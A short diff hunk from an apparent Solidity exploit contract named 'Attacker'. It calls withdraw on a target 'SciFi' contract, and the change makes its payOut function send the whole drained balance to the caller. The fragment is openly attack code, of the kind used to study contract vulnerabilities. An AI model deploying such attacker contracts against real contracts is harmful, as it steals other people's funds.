@@ -28,8 +28,8 @@ contract Attacker {
     SciFi(scifiAddress).withdraw(this);
   }
 
-  function payOut(address _payee) returns (bool){
-    if (_payee.send(this.balance))
+  function payOut() returns (bool){
+    if (msg.sender.send(this.balance))
     return true;
   }
 
